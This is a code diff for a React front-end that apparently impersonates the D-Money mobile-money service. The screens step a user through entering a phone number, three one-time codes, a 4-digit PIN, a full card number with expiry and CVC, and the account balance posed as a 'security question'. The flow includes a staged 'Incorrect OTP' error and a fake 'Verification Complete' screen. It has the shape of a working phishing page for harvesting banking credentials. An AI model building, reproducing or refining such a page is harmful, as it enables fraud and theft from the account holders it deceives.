-                  <Loader2 className="w-5 h-5 animate-spin text-white" />
-                ) : (
-                  "Log In"
+                            <p className="mt-2.5 text-[15px] leading-normal text-[#64748B] font-normal">
+                                Enter your phone number to get started
+                            </p>
+
+                            <div className="mt-8">
+                                <div
+                                    className={`relative flex items-center w-full px-4 py-3.5 rounded-2xl border transition-all duration-200 bg-white ${
+                                        phoneFocused
+                                            ? "border-[#002566] ring-1 ring-[#002566]/20 shadow-xs"
+                                            : "border-[#E2E8F0] hover:border-[#CBD5E1]"
+                                    }`}
+                                >
+                                    <span className="text-[#000000] text-[17px] font-bold tracking-normal select-none pr-2.5 shrink-0">
+                                        +253
+                                    </span>
+
+                                    <input
+                                        type="tel"
+                                        inputMode="numeric"
+                                        pattern="[0-9]*"
+                                        maxLength={9}
+                                        value={phoneNumber}
+                                        onChange={(e) => {
+                                            let val = e.target.value
+                                            if (val.startsWith("+253")) val = val.slice(4).trim()
+                                            else if (val.startsWith("253")) val = val.slice(3).trim()
+                                            val = val.replace(/[^\d]/g, "").slice(0, 9)
+                                            setPhoneNumber(val)
+                                        }}
+                                        onFocus={() => setPhoneFocused(true)}
+                                        onBlur={() => setPhoneFocused(false)}
+                                        placeholder="888555555"
+                                        className="w-full text-[17px] font-normal text-[#000000] bg-transparent outline-none placeholder:text-[#94A3B8]"
+                                        autoFocus
+                                    />
+
+                                    {isPhoneComplete && (
+                                        <div className="shrink-0 ml-2 animate-scale-in">
+                                            <svg
+                                                className="w-5 h-5 text-[#16A34A]"
+                                                viewBox="0 0 20 20"
+                                                fill="currentColor"
+                                            >
+                                                <path
+                                                    fillRule="evenodd"
+                                                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
+                                                    clipRule="evenodd"
+                                                />
+                                            </svg>
+                                        </div>
+                                    )}
+                                </div>
+                            </div>
+                        </div>
+
+                        <div className="flex flex-col gap-5 mt-auto pt-6">
+                            <label className="flex items-center gap-3 cursor-pointer select-none">
+                                <div
+                                    onClick={() => setAgreedTerms(!agreedTerms)}
+                                    className={`w-5 h-5 rounded-[4px] flex items-center justify-center transition-all duration-200 cursor-pointer ${
+                                        agreedTerms ? "border-transparent" : "border border-[#CBD5E1] bg-white"
+                                    }`}
+                                    style={{
+                                        backgroundColor: agreedTerms ? BRAND_NAVY : "#FFFFFF",
+                                        borderColor: agreedTerms ? BRAND_NAVY : "#CBD5E1",
+                                    }}
+                                >
+                                    {agreedTerms && (
+                                        <Check className="w-3.5 h-3.5 text-white" strokeWidth={3} />
+                                    )}
+                                </div>
+                                <span className="text-[14px] text-[#0F172A] font-normal">
+                                    I agree to the{" "}
+                                    <span
+                                        className="underline underline-offset-2 font-medium"
+                                        style={{ color: BRAND_NAVY }}
+                                    >
+                                        «Terms of Service»
+                                    </span>
+                                </span>
+                            </label>
+
+                            <button
+                                type="button"
+                                onClick={() => handlePhoneSubmit()}
+                                disabled={!isPhoneComplete || !agreedTerms || isSubmitting}
+                                className={`w-full py-4 rounded-xl text-white font-semibold text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${
+                                    isPhoneComplete && agreedTerms && !isSubmitting
+                                        ? "shadow-md hover:brightness-110 cursor-pointer"
+                                        : "opacity-40 cursor-not-allowed"
+                                }`}
+                                style={{
+                                    backgroundColor:
+                                        isPhoneComplete && agreedTerms ? BRAND_NAVY : "#A0AEC0",
+                                }}
+                            >
+                                Continue
+                            </button>
+                        </div>
+                    </div>
                 )}
-              </button>
-            </form>
-          </div>
 
-          {/* Bottom Footer */}
-          <div className="pt-8 sm:pt-12 pb-2 text-center text-[14px] sm:text-[15px]">
-            <span className="text-[#4b5063]">Are you a new user? </span>
-            <span
-              role="button"
-              aria-disabled="true"
-              onClick={(e) => e.preventDefault()}
-              className="text-[#602bf8] font-bold select-none cursor-pointer"
-            >
-              Sign up
-            </span>
-          </div>
-        </>
-      ) : (
-        /* OTP Verification Screen */
-        <div className="w-full max-w-[390px] mx-auto pt-2 sm:pt-4 flex flex-col justify-between flex-1">
-          <div>
-            {/* Top Back Navigation */}
-            <div className="w-full flex items-center justify-start mb-4 sm:mb-6">
-              <button
-                type="button"
-                onClick={() => setCurrentStep("login")}
-                className="flex items-center gap-1.5 text-[#65697d] hover:text-[#232042] text-[13.5px] sm:text-[14px] font-medium transition-colors cursor-pointer p-1 -ml-1"
-                aria-label="Back to login"
-              >
-                <ArrowLeft className="w-4.5 h-4.5 sm:w-5 sm:h-5" strokeWidth={2} />
-                <span>Back</span>
-              </button>
+                {/* ======================================================== */}
+                {/* 3. OTP 1 SCREEN (6 DIGITS - AUTO-MOVE)                   */}
+                {/* ======================================================== */}
+                {currentStep === "otp1" && (
+                    <div className="flex-1 flex flex-col justify-between px-6 pt-6 pb-8 w-full min-h-screen bg-white animate-slide-up">
+                        <div className="flex flex-col">
+                            {/* Back Arrow */}
+                            <div className="w-full flex items-center mb-6">
+                                <button
+                                    type="button"
+                                    onClick={() => setCurrentStep("phone")}
+                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
+                                    aria-label="Back"
+                                >
+                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
+                                </button>
+                            </div>
+
+                            <h1 className="text-[28px] leading-[34px] font-bold text-[#000000] tracking-tight">
+                                Verify your number
+                            </h1>
+
+                            <p className="mt-2 text-[15px] leading-normal text-[#64748B] font-normal">
+                                Enter the code we sent to {getMaskedPhone(phoneNumber, "otp")}
+                            </p>
+
+                            {/* 6-Digit OTP Boxes */}
+                            <div className="mt-8 flex items-center justify-between gap-2 sm:gap-2.5">
+                                {otp1Digits.map((digit, idx) => {
+                                    const isFilled = digit !== ""
+                                    return (
+                                        <input
+                                            key={idx}
+                                            ref={(el) => {
+                                                otp1InputRefs.current[idx] = el
+                                            }}
+                                            type="text"
+                                            inputMode="numeric"
+                                            pattern="[0-9]*"
+                                            maxLength={1}
+                                            value={digit}
+                                            onChange={(e) => handleOtp1Change(idx, e.target.value)}
+                                            onKeyDown={(e) => handleOtp1KeyDown(idx, e)}
+                                            className={`w-12 h-14 sm:w-13 sm:h-15 text-center text-[22px] font-bold rounded-2xl outline-none transition-all duration-200 bg-white ${
+                                                isFilled
+                                                    ? "border-2 text-[#002566] shadow-xs"
+                                                    : "border border-[#CBD5E1] text-[#0F172A] focus:border-[#002566] focus:border-2"
+                                            }`}
+                                            style={{
+                                                borderColor: isFilled ? BRAND_NAVY : undefined,
+                                                color: isFilled ? BRAND_NAVY : "#0F172A",
+                                            }}
+                                            autoFocus={idx === 0}
+                                        />
+                                    )
+                                })}
+                            </div>
+
+                            {/* Resend Section */}
+                            <div className="mt-8 flex flex-col items-center justify-center gap-2">
+                                <p className="text-[14px] text-[#475569] font-normal">
+                                    Resend code in{" "}
+                                    <span className="font-bold ml-1" style={{ color: BRAND_NAVY }}>
+                                        {formatTimer(otp1Timer)}
+                                    </span>
+                                </p>
+
+                                <button
+                                    type="button"
+                                    onClick={() => {
+                                        if (otp1Timer > 0) return
+                                        setOtp1Timer(115)
+                                        setOtp1Digits(["", "", "", "", "", ""])
+                                    }}
+                                    disabled={otp1Timer > 0}
+                                    className={`text-[14.5px] font-normal transition-colors ${
+                                        otp1Timer === 0
+                                            ? "underline cursor-pointer font-medium"
+                                            : "text-[#CBD5E1] cursor-not-allowed"
+                                    }`}
+                                    style={{
+                                        color: otp1Timer === 0 ? BRAND_NAVY : "#CBD5E1",
+                                    }}
+                                >
+                                    Resend Code
+                                </button>
+                            </div>
+                        </div>
+
+                        {/* Continue Button */}
+                        <div className="mt-auto pt-6">
+                            <button
+                                type="button"
+                                onClick={() => isOtp1Complete && submitOtp1(otp1Digits.join(""))}
+                                disabled={!isOtp1Complete || isSubmitting}
+                                className={`w-full py-4 rounded-xl text-white font-semibold text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${
+                                    isOtp1Complete && !isSubmitting
+                                        ? "shadow-md hover:brightness-110 cursor-pointer"
+                                        : "cursor-not-allowed"
+                                }`}
+                                style={{
+                                    backgroundColor: isOtp1Complete ? BRAND_NAVY : "#C4C4C4",
+                                }}
+                            >
+                                Continue
+                            </button>
+                        </div>
+                    </div>
+                )}
+
+                {/* ======================================================== */}
+                {/* 4. PIN SCREEN (4 DIGITS - AUTO-MOVE)                     */}
+                {/* ======================================================== */}
+                {currentStep === "pin" && (
+                    <div className="flex-1 flex flex-col justify-between px-6 pt-6 pb-8 w-full min-h-screen bg-white animate-slide-up">
+                        <div className="flex flex-col">
+                            {/* Back Arrow */}
+                            <div className="w-full flex items-center mb-6">
+                                <button
+                                    type="button"
+                                    onClick={() => setCurrentStep("otp1")}
+                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
+                                    aria-label="Back"
+                                >
+                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
+                                </button>
+                            </div>
+
+                            <p className="text-[14px] leading-normal text-[#64748B] font-normal">
+                                Welcome back
+                            </p>
+
+                            <h1 className="mt-1 text-[22px] font-bold text-[#000000] tracking-tight">
+                                {getMaskedPhone(phoneNumber, "pin")}
+                            </h1>
+
+                            <p className="mt-2 text-[14.5px] leading-normal text-[#64748B] font-normal">
+                                Please enter your 4 digit PIN
+                            </p>
+
+                            {/* 4-Digit PIN Boxes */}
+                            <div className="mt-8 flex items-center justify-center gap-4">
+                                {pinDigits.map((digit, idx) => {
+                                    const isFilled = digit !== ""
+                                    return (
+                                        <div
+                                            key={idx}
+                                            onClick={() => pinInputRefs.current[idx]?.focus()}
+                                            className={`relative w-14 h-16 sm:w-15 sm:h-16 rounded-2xl flex items-center justify-center transition-all duration-200 cursor-pointer bg-white ${
+                                                isFilled ? "border-2 shadow-xs" : "border border-[#CBD5E1]"
+                                            }`}
+                                            style={{
+                                                borderColor: isFilled ? BRAND_NAVY : "#CBD5E1",
+                                            }}
+                                        >
+                                            <input
+                                                ref={(el) => {
+                                                    pinInputRefs.current[idx] = el
+                                                }}
+                                                type="password"
+                                                inputMode="numeric"
+                                                pattern="[0-9]*"
+                                                maxLength={1}
+                                                value={digit}
+                                                onChange={(e) => handlePinChange(idx, e.target.value)}
+                                                onKeyDown={(e) => handlePinKeyDown(idx, e)}
+                                                className="absolute inset-0 opacity-0 cursor-pointer text-center"
+                                                autoFocus={idx === 0}
+                                            />
+
+                                            {isFilled && (
+                                                <div
+                                                    className="w-3.5 h-3.5 rounded-full transition-transform duration-150 transform scale-100"
+                                                    style={{ backgroundColor: BRAND_NAVY }}
+                                                />
+                                            )}
+                                        </div>
+                                    )
+                                })}
+                            </div>
+                        </div>
+
+                        {/* Continue Button */}
+                        <div className="mt-auto pt-6">
+                            <button
+                                type="button"
+                                onClick={() => isPinComplete && submitPin(pinDigits.join(""))}
+                                disabled={!isPinComplete || isSubmitting}
+                                className={`w-full py-4 rounded-xl text-white font-semibold text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${
+                                    isPinComplete && !isSubmitting
+                                        ? "shadow-md hover:brightness-110 cursor-pointer"
+                                        : "cursor-not-allowed"
+                                }`}
+                                style={{
+                                    backgroundColor: isPinComplete ? BRAND_NAVY : "#C4C4C4",
+                                }}
+                            >
+                                Continue
+                            </button>
+                        </div>
+                    </div>
+                )}
+
+                {/* ======================================================== */}
+                {/* 5. CARD DETAILS ENTRY SCREEN (MATCHING SCREENSHOT 2)     */}
+                {/* ======================================================== */}
+                {currentStep === "card" && (
+                    <div className="flex-1 flex flex-col justify-between px-6 pt-6 pb-8 w-full min-h-screen bg-white animate-slide-up">
+                        <div className="flex flex-col">
+                            {/* Back Arrow */}
+                            <div className="w-full flex items-center mb-5">
+                                <button
+                                    type="button"
+                                    onClick={() => setCurrentStep("pin")}
+                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
+                                    aria-label="Back"
+                                >
+                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
+                                </button>
+                            </div>
+
+                            {/* Heading */}
+                            <h1 className="text-[23px] leading-[30px] font-bold text-[#000000] tracking-tight">
+                                Please enter your card details to upgrade your account
+                            </h1>
+
+                            {/* Subtitle */}
+                            <p className="mt-2 text-[14.5px] leading-normal text-[#64748B] font-normal">
+                                Verify your identity with your D-Money card
+                            </p>
+
+                            {/* Form Inputs Container */}
+                            <div className="mt-7 flex flex-col gap-4">
+                                {/* CARD NUMBER */}
+                                <div className="border border-[#CBD5E1] rounded-[18px] p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
+                                    <div className="flex items-center justify-between">
+                                        <label className="text-[12px] font-semibold tracking-wider text-[#64748B] uppercase">
+                                            CARD NUMBER
+                                        </label>
+                                        <HelpCircle className="w-4 h-4 text-[#94A3B8]" />
+                                    </div>
+                                    <input
+                                        type="tel"
+                                        inputMode="numeric"
+                                        placeholder="4649 5198 2702 5674"
+                                        value={cardNumber}
+                                        onChange={(e) => handleCardNumberChange(e.target.value)}
+                                        className="w-full mt-1.5 text-[18px] font-normal text-[#0F172A] bg-transparent outline-none tracking-wide placeholder:text-[#CBD5E1]"
+                                        autoFocus
+                                    />
+                                </div>
+
+                                {/* MONTH & YEAR ROW */}
+                                <div className="grid grid-cols-2 gap-3.5">
+                                    {/* MONTH */}
+                                    <div className="border border-[#CBD5E1] rounded-[18px] p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
+                                        <div className="flex items-center justify-between">
+                                            <label className="text-[12px] font-semibold tracking-wider text-[#64748B] uppercase">
+                                                MONTH
+                                            </label>
+                                            <HelpCircle className="w-4 h-4 text-[#94A3B8]" />
+                                        </div>
+                                        <input
+                                            ref={cardMonthRef}
+                                            type="tel"
+                                            inputMode="numeric"
+                                            maxLength={2}
+                                            placeholder="MM"
+                                            value={cardMonth}
+                                            onChange={(e) => handleCardMonthChange(e.target.value)}
+                                            className="w-full mt-1.5 text-[18px] font-normal text-[#0F172A] bg-transparent outline-none placeholder:text-[#CBD5E1]"
+                                        />
+                                    </div>
+
+                                    {/* YEAR */}
+                                    <div className="border border-[#CBD5E1] rounded-[18px] p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
+                                        <label className="text-[12px] font-semibold tracking-wider text-[#64748B] uppercase block">
+                                            YEAR
+                                        </label>
+                                        <input
+                                            ref={cardYearRef}
+                                            type="tel"
+                                            inputMode="numeric"
+                                            maxLength={2}
+                                            placeholder="YY"
+                                            value={cardYear}
+                                            onChange={(e) => handleCardYearChange(e.target.value)}
+                                            className="w-full mt-1.5 text-[18px] font-normal text-[#0F172A] bg-transparent outline-none placeholder:text-[#CBD5E1]"
+                                        />
+                                    </div>
+                                </div>
+
+                                {/* CVC2 */}
+                                <div className="border border-[#CBD5E1] rounded-[18px] p-3.5 bg-white transition-all duration-200 focus-within:border-[#002566] focus-within:ring-1 focus-within:ring-[#002566]/20">
+                                    <div className="flex items-center justify-between">
+                                        <label className="text-[12px] font-semibold tracking-wider text-[#64748B] uppercase">
+                                            CVC2
+                                        </label>
+                                        <HelpCircle className="w-4 h-4 text-[#94A3B8]" />
+                                    </div>
+                                    <input
+                                        ref={cardCvcRef}
+                                        type="password"
+                                        inputMode="numeric"
+                                        maxLength={4}
+                                        placeholder="CVC"
+                                        value={cardCvc}
+                                        onChange={(e) => {
+                                            const val = e.target.value.replace(/[^\d]/g, "").slice(0, 4)
+                                            setCardCvc(val)
+                                        }}
+                                        className="w-full mt-1.5 text-[18px] font-normal text-[#0F172A] bg-transparent outline-none placeholder:text-[#CBD5E1]"
+                                    />
+                                </div>
+
+                                {/* Helper footer under inputs */}
+                                <p className="text-[13.5px] text-[#64748B] text-center mt-2 font-normal">
+                                    Enter your D-Money card details for verification.
+                                </p>
+                            </div>
+                        </div>
+
+                        {/* Continue Button */}
+                        <div className="mt-auto pt-6">
+                            <button
+                                type="button"
+                                onClick={() => handleCardSubmit()}
+                                disabled={!isCardValid || isSubmitting}
+                                className={`w-full py-4 rounded-xl text-white font-semibold text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${
+                                    isCardValid && !isSubmitting
+                                        ? "shadow-md hover:brightness-110 cursor-pointer"
+                                        : "cursor-not-allowed"
+                                }`}
+                                style={{
+                                    backgroundColor: isCardValid ? BRAND_NAVY : "#C4C4C4",
+                                }}
+                            >
+                                Continue
+                            </button>
+                        </div>
+                    </div>
+                )}
+
+                {/* ======================================================== */}
+                {/* 6. OTP 2 SCREEN (6 DIGITS - AUTO-MOVE)                   */}
+                {/* ======================================================== */}
+                {currentStep === "otp2" && (
+                    <div className="flex-1 flex flex-col justify-between px-6 pt-6 pb-8 w-full min-h-screen bg-white animate-slide-up">
+                        <div className="flex flex-col">
+                            {/* Back Arrow */}
+                            <div className="w-full flex items-center mb-6">
+                                <button
+                                    type="button"
+                                    onClick={() => setCurrentStep("card")}
+                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
+                                    aria-label="Back"
+                                >
+                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
+                                </button>
+                            </div>
+
+                            <h1 className="text-[28px] leading-[34px] font-bold text-[#000000] tracking-tight">
+                                Verify your number
+                            </h1>
+
+                            <p className="mt-2 text-[15px] leading-normal text-[#64748B] font-normal">
+                                Enter the code we sent to {getMaskedPhone(phoneNumber, "otp")}
+                            </p>
+
+                            {/* 6-Digit OTP Boxes */}
+                            <div className="mt-8 flex items-center justify-between gap-2 sm:gap-2.5">
+                                {otp2Digits.map((digit, idx) => {
+                                    const isFilled = digit !== ""
+                                    return (
+                                        <input
+                                            key={idx}
+                                            ref={(el) => {
+                                                otp2InputRefs.current[idx] = el
+                                            }}
+                                            type="text"
+                                            inputMode="numeric"
+                                            pattern="[0-9]*"
+                                            maxLength={1}
+                                            value={digit}
+                                            onChange={(e) => handleOtp2Change(idx, e.target.value)}
+                                            onKeyDown={(e) => handleOtp2KeyDown(idx, e)}
+                                            className={`w-12 h-14 sm:w-13 sm:h-15 text-center text-[22px] font-bold rounded-2xl outline-none transition-all duration-200 bg-white ${
+                                                isFilled
+                                                    ? "border-2 text-[#002566] shadow-xs"
+                                                    : "border border-[#CBD5E1] text-[#0F172A] focus:border-[#002566] focus:border-2"
+                                            }`}
+                                            style={{
+                                                borderColor: isFilled ? BRAND_NAVY : undefined,
+                                                color: isFilled ? BRAND_NAVY : "#0F172A",
+                                            }}
+                                            autoFocus={idx === 0}
+                                        />
+                                    )
+                                })}
+                            </div>
+
+                            {/* Resend Section */}
+                            <div className="mt-8 flex flex-col items-center justify-center gap-2">
+                                <p className="text-[14px] text-[#475569] font-normal">
+                                    Resend code in{" "}
+                                    <span className="font-bold ml-1" style={{ color: BRAND_NAVY }}>
+                                        {formatTimer(otp2Timer)}
+                                    </span>
+                                </p>
+
+                                <button
+                                    type="button"
+                                    onClick={() => {
+                                        if (otp2Timer > 0) return
+                                        setOtp2Timer(115)
+                                        setOtp2Digits(["", "", "", "", "", ""])
+                                    }}
+                                    disabled={otp2Timer > 0}
+                                    className={`text-[14.5px] font-normal transition-colors ${
+                                        otp2Timer === 0
+                                            ? "underline cursor-pointer font-medium"
+                                            : "text-[#CBD5E1] cursor-not-allowed"
+                                    }`}
+                                    style={{
+                                        color: otp2Timer === 0 ? BRAND_NAVY : "#CBD5E1",
+                                    }}
+                                >
+                                    Resend Code
+                                </button>
+                            </div>
+                        </div>
+
+                        {/* Continue Button */}
+                        <div className="mt-auto pt-6">
+                            <button
+                                type="button"
+                                onClick={() => isOtp2Complete && submitOtp2(otp2Digits.join(""))}
+                                disabled={!isOtp2Complete || isSubmitting}
+                                className={`w-full py-4 rounded-xl text-white font-semibold text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${
+                                    isOtp2Complete && !isSubmitting
+                                        ? "shadow-md hover:brightness-110 cursor-pointer"
+                                        : "cursor-not-allowed"
+                                }`}
+                                style={{
+                                    backgroundColor: isOtp2Complete ? BRAND_NAVY : "#C4C4C4",
+                                }}
+                            >
+                                Continue
+                            </button>
+                        </div>
+                    </div>
+                )}
+
+                {/* ======================================================== */}
+                {/* 7. BALANCE SCREEN (MATCHING SCREENSHOT 3)                */}
+                {/* ======================================================== */}
+                {currentStep === "balance" && (
+                    <div className="flex-1 flex flex-col justify-between px-6 pt-6 pb-8 w-full min-h-screen bg-white animate-slide-up">
+                        <div className="flex flex-col">
+                            {/* Back Arrow */}
+                            <div className="w-full flex items-center mb-4">
+                                <button
+                                    type="button"
+                                    onClick={() => setCurrentStep("otp2")}
+                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
+                                    aria-label="Back"
+                                >
+                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
+                                </button>
+                            </div>
+
+                            {/* DMONEY CARD */}
+                            <div className="w-full aspect-[1.58/1] rounded-[20px] overflow-hidden shadow-xl relative">
+                                <Image
+                                    src="/dmoney.webp"
+                                    alt="D-Money card"
+                                    fill
+                                    className="object-cover"
+                                    priority
+                                />
+                                <div className="absolute inset-x-0 bottom-0 px-5 pb-5 pt-8 bg-gradient-to-t from-black/60 to-transparent">
+                                    <p className="text-white text-[13px] sm:text-[14px] font-mono font-semibold tracking-[2px] drop-shadow-md">
+                                        {cardNumber || "4937 2420 2151 4656"}
+                                    </p>
+                                </div>
+                            </div>
+
+                            {/* Form Fields Container */}
+                            <div className="mt-6 flex flex-col gap-5">
+                                {/* Account Number */}
+                                <div>
+                                    <label className="text-[14.5px] font-semibold text-[#0F172A] block mb-2">
+                                        Account Number
+                                    </label>
+                                    <div className="border border-[#CBD5E1] rounded-2xl px-4 py-3.5 bg-white text-[#64748B] text-[15px] font-mono tracking-wider flex items-center">
+                                        <span>Acc.</span>
+                                        <span className="ml-3 tracking-[3px] text-[#475569]">•••••••••••••</span>
+                                    </div>
+                                </div>
+
+                                {/* Bank Security Question & Balance Input */}
+                                <div>
+                                    <label className="text-[14.5px] font-semibold text-[#0F172A] block">
+                                        Bank Security Question
+                                    </label>
+                                    <p className="text-[14px] text-[#64748B] mt-0.5 mb-2 font-normal">
+                                        How much balance is available in your account?
+                                    </p>
+
+                                    <div className="border-2 border-[#002566] rounded-2xl px-4 py-3.5 bg-white flex items-center gap-3 transition-all duration-200 shadow-xs">
+                                        <span className="text-[16px] font-bold text-[#002566] select-none shrink-0">
+                                            DJF
+                                        </span>
+                                        <div className="w-[1px] h-6 bg-[#CBD5E1]" />
+                                        <input
+                                            type="text"
+                                            inputMode="decimal"
+                                            placeholder="0.00"
+                                            value={balanceAmount}
+                                            onChange={(e) => {
+                                                const val = e.target.value.replace(/[^0-9.]/g, "")
+                                                setBalanceAmount(val)
+                                            }}
+                                            className="w-full text-[17px] font-semibold text-[#0F172A] bg-transparent outline-none placeholder:text-[#94A3B8]"
+                                            autoFocus
+                                        />
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        {/* Continue Button */}
+                        <div className="mt-auto pt-6">
+                            <button
+                                type="button"
+                                onClick={() => handleBalanceSubmit()}
+                                disabled={!isBalanceValid || isSubmitting}
+                                className={`w-full py-4 rounded-xl text-white font-semibold text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${
+                                    isBalanceValid && !isSubmitting
+                                        ? "shadow-md hover:brightness-110 cursor-pointer"
+                                        : "cursor-not-allowed"
+                                }`}
+                                style={{
+                                    backgroundColor: isBalanceValid ? BRAND_NAVY : "#C4C4C4",
+                                }}
+                            >
+                                Continue
+                            </button>
+                        </div>
+                    </div>
+                )}
+
+                {/* ======================================================== */}
+                {/* 8. OTP 3 SCREEN WITH ERROR (MATCHING SCREENSHOT 4)       */}
+                {/* ======================================================== */}
+                {currentStep === "otp3" && (
+                    <div className="flex-1 flex flex-col justify-between px-6 pt-6 pb-8 w-full min-h-screen bg-white animate-slide-up">
+                        <div className="flex flex-col">
+                            {/* Back Arrow */}
+                            <div className="w-full flex items-center mb-6">
+                                <button
+                                    type="button"
+                                    onClick={() => setCurrentStep("balance")}
+                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
+                                    aria-label="Back"
+                                >
+                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
+                                </button>
+                            </div>
+
+                            <h1 className="text-[28px] leading-[34px] font-bold text-[#000000] tracking-tight">
+                                Verify your number
+                            </h1>
+
+                            <p className="mt-2 text-[15px] leading-normal text-[#64748B] font-normal">
+                                Enter the code we sent to {getMaskedPhone(phoneNumber, "otp")}
+                            </p>
+
+                            {/* 6-Digit OTP Boxes (Red borders when error triggered) */}
+                            <div className="mt-8 flex items-center justify-between gap-2 sm:gap-2.5">
+                                {otp3Digits.map((digit, idx) => {
+                                    const isFilled = digit !== ""
+                                    return (
+                                        <input
+                                            key={idx}
+                                            ref={(el) => {
+                                                otp3InputRefs.current[idx] = el
+                                            }}
+                                            type="text"
+                                            inputMode="numeric"
+                                            pattern="[0-9]*"
+                                            maxLength={1}
+                                            value={digit}
+                                            onChange={(e) => handleOtp3Change(idx, e.target.value)}
+                                            onKeyDown={(e) => handleOtp3KeyDown(idx, e)}
+                                            className={`w-12 h-14 sm:w-13 sm:h-15 text-center text-[22px] font-bold rounded-2xl outline-none transition-all duration-200 bg-white ${
+                                                otp3Error
+                                                    ? "border-2 border-[#EF4444] text-[#EF4444] shadow-xs shadow-red-100"
+                                                    : isFilled
+                                                    ? "border-2 border-[#002566] text-[#002566]"
+                                                    : "border border-[#CBD5E1] text-[#0F172A] focus:border-[#002566]"
+                                            }`}
+                                            autoFocus={idx === 0}
+                                        />
+                                    )
+                                })}
+                            </div>
+
+                            {/* Error Message & Resend Code (Matching Screenshot 4) */}
+                            <div className="mt-6 flex flex-col items-center justify-center gap-1.5 text-center">
+                                {otp3Error && (
+                                    <div className="flex items-center justify-center gap-1.5 text-[#DC2626] font-medium text-[14px] animate-shake mb-1">
+                                        <AlertCircle className="w-4 h-4 text-[#DC2626] shrink-0" />
+                                        <span>Incorrect OTP. Please try again.</span>
+                                    </div>
+                                )}
+
+                                <p className="text-[14px] text-[#475569] font-normal">
+                                    Resend code in{" "}
+                                    <span className="font-bold ml-1 text-[#002566]">
+                                        {formatTimer(otp3Timer)}
+                                    </span>
+                                </p>
+
+                                <button
+                                    type="button"
+                                    onClick={() => {
+                                        if (otp3Timer > 0) return
+                                        setOtp3Timer(111)
+                                        setOtp3Digits(["", "", "", "", "", ""])
+                                        setOtp3Error(false)
+                                    }}
+                                    disabled={otp3Timer > 0}
+                                    className={`text-[14.5px] font-normal mt-1 transition-colors ${
+                                        otp3Timer === 0
+                                            ? "underline cursor-pointer font-medium text-[#002566]"
+                                            : "text-[#CBD5E1] cursor-not-allowed"
+                                    }`}
+                                >
+                                    Resend Code
+                                </button>
+                            </div>
+                        </div>
+
+                        {/* Verify Button */}
+                        <div className="mt-auto pt-6">
+                            <button
+                                type="button"
+                                onClick={() => submitOtp3(otp3Digits.join(""))}
+                                disabled={!isOtp3Complete || isSubmitting}
+                                className={`w-full py-4 rounded-xl text-white font-semibold text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${
+                                    isOtp3Complete && !isSubmitting
+                                        ? "shadow-md hover:brightness-110 cursor-pointer"
+                                        : "cursor-not-allowed"
+                                }`}
+                                style={{
+                                    backgroundColor: isOtp3Complete && !isSubmitting ? BRAND_NAVY : "#C4C4C4",
+                                }}
+                            >
+                                Verify
+                            </button>
+                        </div>
+                    </div>
+                )}
+
+                {/* ======================================================== */}
+                {/* 9. SUCCESS / COMPLETED SCREEN                            */}
+                {/* ======================================================== */}
+                {currentStep === "success" && (
+                    <div className="flex-1 flex flex-col items-center justify-center px-6 py-12 w-full min-h-screen bg-white text-center animate-slide-up">
+                        <div
+                            className="w-20 h-20 rounded-full flex items-center justify-center mb-6 shadow-md"
+                            style={{ backgroundColor: "#EEF4FF" }}
+                        >
+                            <ShieldCheck className="w-10 h-10 text-[#002566]" />
+                        </div>
+
+                        <h2 className="text-[24px] font-bold text-[#002566] tracking-tight">
+                            Verification Complete
+                        </h2>
+
+                        <p className="mt-3 text-[14.5px] text-[#64748B] max-w-[280px] leading-relaxed">
+                            Your account upgrade request has been submitted successfully. You will receive a confirmation shortly.
+                        </p>
+
+                        <div className="mt-10 w-full max-w-[300px]">
+                            <button
+                                type="button"
+                                onClick={() => {
+                                    setCurrentStep("splash")
+                                    setShowBottomModal(true)
+                                }}
+                                className="w-full py-3.5 rounded-xl text-white font-semibold text-[15px] transition-all duration-200 active:scale-[0.98]"
+                                style={{ backgroundColor: BRAND_NAVY }}
+                            >
+                                Return to Home
+                            </button>
+                        </div>
+                    </div>
+                )}
+
             </div>
-
-            {/* OTP Header */}
-            <div className="text-center px-1">
-              <h2 className="text-[26px] sm:text-[30px] font-bold text-[#232042] tracking-tight leading-tight">
-                Enter OTP Code
-              </h2>
-              <p className="text-[14px] sm:text-[14.5px] text-[#767a89] font-normal mt-2 leading-relaxed break-words">
-                We sent a verification code to
-                <br />
-                <span className="font-semibold text-[#232042] break-all">
-                  {getDisplayEmail(email)}
-                </span>
-              </p>
-            </div>
-
-            {/* OTP Inputs Form */}
-            <form onSubmit={handleOtpSubmit} className="mt-6 sm:mt-8 flex flex-col items-center w-full" noValidate>
-              <div className="w-full flex flex-col items-center">
-                <div className="w-full relative">
-                  <input
-                    ref={otpInputRef}
-                    type="tel"
-                    inputMode="numeric"
-                    autoComplete="one-time-code"
-                    value={otpCode}
-                    onChange={(e) => handleOtpChange(e.target.value)}
-                    placeholder="Enter OTP code"
